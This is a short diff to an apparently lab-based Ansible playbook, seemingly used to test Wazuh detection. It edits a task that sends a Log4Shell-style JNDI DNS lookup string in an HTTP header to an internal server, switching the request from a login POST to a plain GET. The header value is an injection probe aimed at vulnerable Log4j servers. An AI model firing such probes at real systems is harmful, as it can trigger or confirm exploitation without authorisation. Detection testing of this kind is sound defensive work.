@@ -1063,13 +1063,10 @@ wazuh_manager_ip: 192.168.10.200
   tasks:
     - name: Fire JNDI DNS probe (benign — no code execution)
       ansible.builtin.uri:
-        url: http://192.168.10.100:8080/api/login
-        method: POST
+        url: http://192.168.10.100:8080/
+        method: GET
         headers:
           X-Api-Version: "${jndi:dns://10.0.0.20/test-probe}"
-          Content-Type: application/json
-        body: '{"username":"test","password":"probe"}'
-        body_format: raw
         validate_certs: false
         status_code: [200, 400, 401, 500]
       register: probe_result
